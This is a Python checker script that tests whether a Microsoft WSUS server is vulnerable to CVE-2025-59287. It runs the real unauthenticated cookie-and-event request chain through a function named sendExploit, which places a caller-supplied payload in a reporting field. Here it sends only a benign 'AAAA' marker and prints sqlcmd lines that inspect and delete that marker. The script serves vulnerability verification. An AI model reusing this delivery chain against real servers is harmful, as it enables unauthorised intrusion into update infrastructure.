CVE-2025-59287-Checker.py

#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
r''' 
    Copyright 2025 Photubias(c)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    File name CVE-2025-59287-Checker.py
    written by Tijl Deneut
    
    This script performs some OPSEC Safe checks on any WSUS installation to verify if it is vulnerable to
    CVE-2025-59287: Unauthenticated Remote Code Execution
'''
import requests, uuid, urllib3, sys, datetime
import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sDefTarget='http://192.168.50.136:8530'
## 8530 == http, 8531 == https

def getServerId(sTarget):
    sURL = f'{sTarget}/ReportingWebService/ReportingWebService.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration"',
        'Content-Type': 'text/xml'
    }

    sSoapBody = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetRollupConfiguration xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
</GetRollupConfiguration>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False)
        oResp.raise_for_status()

        ## It seems patch KB5070881 (on Server 2025 at least) removes a header "Vary: Accept-Encoding" from all responses, TODO: test on other systems (e.g. Server 2022)
        if 'Vary' in oResp.headers: print('     Hint: Probably a vulnerable server, based on response headers')
        else: print('     Hint: This server is probably patched, based on response headers')

        oRoot = ET.fromstring(oResp.text)
        for oElem in oRoot.iter():
            if 'ServerId' in oElem.tag and oElem.text:
                print(f'[+] Server ID: {oElem.text}')
                return oElem.text

    except requests.exceptions.RequestException as e: print(f'[-] Request Exception: {str(e)}')
    except ET.ParseError as e: print(f'[-] XML Parse issue: {str(e)}')

    sFallbackId = str(uuid.uuid4())
    print(f'[!] fallback id: {sFallbackId}')
    return sFallbackId

def getAuthCookie(sTarget, sServerId = None):
    sURL = f'{sTarget}/SimpleAuthWebService/SimpleAuth.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"',
        'Content-Type': 'text/xml'
    }

    if sServerId is None: sServerId = str(uuid.uuid4())

    sSoapBody = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetAuthorizationCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService">
<clientId>{sServerId}</clientId>
<targetGroupName></targetGroupName>
<dnsName>photubias.vulndemo.local</dnsName>
</GetAuthorizationCookie>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False)
        oResp.raise_for_status()  # Triggered HTTP error status code exception

        # Parsing the response to extract CookieData
        oRoot = ET.fromstring(oResp.text)
        for oElem in oRoot.iter():
            if 'CookieData' in oElem.tag and oElem.text:
                print(f'[+] Got Cookie for : {sServerId}')
                return oElem.text

    except requests.exceptions.RequestException as e: print(f'[-] Error running request : {str(e)}')
    except ET.ParseError as e: print(f'[-] Error parsing XML: {str(e)}')

    return None

def getReportingCookie(sTarget, sAuthCookie):
    sURL = f'{sTarget}/ClientWebService/Client.asmx'
    dctHeaders = {
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"',
        'Content-Type': 'text/xml'
    }

    sDateTimeNow = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')

    sSoapBody = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
<authCookies>
<AuthorizationCookie>
<PlugInId>SimpleTargeting</PlugInId>
<CookieData>{sAuthCookie}</CookieData>
</AuthorizationCookie>
</authCookies>
<oldCookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
<lastChange>{sDateTimeNow}</lastChange>
<currentTime>{sDateTimeNow}</currentTime>
<protocolVersion>1.20</protocolVersion>
</GetCookie>
</soap:Body>
</soap:Envelope>'''

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False)
        oResp.raise_for_status()

        oRoot = ET.fromstring(oResp.text)
        dctCookieData = {}
        for oElem in oRoot.iter():
            if 'Expiration' in oElem.tag: dctCookieData['expiration'] = oElem.text
            elif 'EncryptedData' in oElem.tag: dctCookieData['encrypted_data'] = oElem.text

        if 'encrypted_data' in dctCookieData: return dctCookieData

    except requests.exceptions.RequestException as e: print(f'[-] Error requesting cookie: {str(e)}')
    except ET.ParseError as e: print(f'[-] Error parsing XML: {str(e)}')

    return None

def sendExploit(sTarget, dctCookie, sPayload):
    sURL = f'{sTarget}/ReportingWebService/ReportingWebService.asmx'

    # Generate Random ID and Timestamp
    sTargetSID = str(uuid.uuid4())
    sEventInstanceID = str(uuid.uuid4())
    sDateTimeNow = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3]

    # Prepare SOAP body
    sSoapBody = f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soap:Body>
<ReportEventBatch xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie>
<Expiration>{dctCookie['expiration']}</Expiration>
<EncryptedData>{dctCookie['encrypted_data']}</EncryptedData>
</cookie>
<clientTime>{sDateTimeNow}</clientTime>
<eventBatch xmlns:q1="http://www.microsoft.com/SoftwareDistribution" soapenc:arrayType="q1:ReportingEvent[1]">
<ReportingEvent>
<BasicData>
<TargetID>
<Sid>{sTargetSID}</Sid>
</TargetID>
<SequenceNumber>0</SequenceNumber>
<TimeAtTarget>{sDateTimeNow}</TimeAtTarget>
<EventInstanceID>{sEventInstanceID}</EventInstanceID>
<NamespaceID>2</NamespaceID>
<EventID>389</EventID>
<SourceID>301</SourceID>
<UpdateID>
<UpdateID>00000000-0000-0000-0000-000000000000</UpdateID>
<RevisionNumber>0</RevisionNumber>
</UpdateID>
<Win32HResult>0</Win32HResult>
<AppName>LocalServer</AppName>
</BasicData>
<ExtendedData>
<MiscData soapenc:arrayType="xsd:string[2]">
<string>Administrator=SYSTEM</string>
<string>SynchronizationUpdateErrorsKey={escape(sPayload)}</string>
</MiscData>
</ExtendedData>
<PrivateData>
<ComputerDnsName></ComputerDnsName>
<UserAccountName></UserAccountName>
</PrivateData>
</ReportingEvent>
</eventBatch>
</ReportEventBatch>
</soap:Body>
</soap:Envelope>'''

    sHost = sTarget.replace('http://', '').replace('https://', '')
    dctHeaders = {
        'Connection': 'Keep-Alive',
        'Content-Type': 'text/xml',
        'Accept': 'text/xml',
        'User-Agent': 'Windows-Update-Agent',
        'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"',
        'Host': sHost
    }

    try:
        oResp = requests.post(sURL, data=sSoapBody, headers=dctHeaders, timeout=30, verify=False)
        oResp.raise_for_status()

        if 'true' in oResp.text:
            return True, sEventInstanceID, sTargetSID
        else:
            print(f'[-] Malicious event sending failed, response content: {oResp.text[:200]}')
            return False, None, None

    except requests.exceptions.RequestException as e:
        print(f'[-] HTTP Request failed: {str(e)}')
        return False, None, None

def main(sTarget):
    print('[+] Retrieving server ID')
    sServerID = getServerId(sTarget)

    print('[+] Retrieving authentication cookie using server ID')
    sAuthCookie = getAuthCookie(sTarget, sServerID)
    if not sAuthCookie: 
        print('[-] Error getting auth cookie')
        return
    #print(sAuthCookie)

    print('[i] Retrieving report service cookie')
    sReportingCookie = getReportingCookie(sTarget, sAuthCookie)
    if not sReportingCookie:
        print('[-] Unable to obtain report service cookie, not a WSUS server. Exiting process.')
        return
    #print(sReportingCookie)

    sAnswer = input('[?] Ready to send a verification (empty, OPSEC SAFE) payload? [y/N]: ')
    if not 'y' in sAnswer.lower(): exit()
    boolSuccess, sEventID, sTargetSID = sendExploit(sTarget, sReportingCookie, 'AAAA')
    if not boolSuccess: 
        print('[-] Target seems to be patched')
        return
    else:
        print('[+] Target seems to be vulnerable')
        print('     Want proof? Download sqlcmd.exe to the victim and run this command, it should list a "SynchronizationUpdateErrorsKey=AAAA" value')
        print(r'       sqlcmd -S \\.\pipe\Microsoft##WID\tsql\query -y0 -Q "SELECT TOP (2) EventInstanceID,TimeAtServer,MiscData FROM [SUSDB].[dbo].[tbEventInstance] ORDER BY TimeAtServer Desc"')
        print('     Remove the entry?')
        print('       sqlcmd -S \\\\.\\pipe\\Microsoft##WID\\tsql\\query -y0 -Q "DELETE FROM [SUSDB].[dbo].[tbEventInstance] WHERE EventInstanceID = \'{}\'"'.format(sEventID))
    return

if __name__ == '__main__':
    if len(sys.argv) < 2: 
        sTarget = input(f'[?] URL of the system to test? [{sDefTarget}]: ')
        if sTarget == '': sTarget = sDefTarget
    else: sTarget = sys.argv[1]
    print(f'### Target: {sTarget} ###')
    main(sTarget)
    exit(0)
